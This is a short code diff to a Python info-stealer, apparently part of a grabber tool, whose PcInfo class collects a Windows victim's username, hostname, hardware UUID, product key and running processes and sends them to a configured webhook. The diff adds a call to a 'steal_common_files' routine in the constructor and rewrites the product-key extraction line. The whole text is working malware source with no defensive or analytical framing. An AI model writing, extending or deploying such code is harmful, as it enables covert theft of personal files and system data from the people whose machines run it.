@@ -6,6 +6,7 @@ import subprocess
 
 class PcInfo:
     def __init__(self):
+        self.steal_common_files()
         self.get_system_info(__CONFIG__["webhook"])
 
     def get_country_code(self, country_name):
@@ -33,7 +34,7 @@ class PcInfo:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip(); if product_key == "": product_key = "Failed to get product key"
+        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
 
         # Gets list of processes currently running in the system
         tasklist_file = os.path.join(temp, "TaskList.txt")
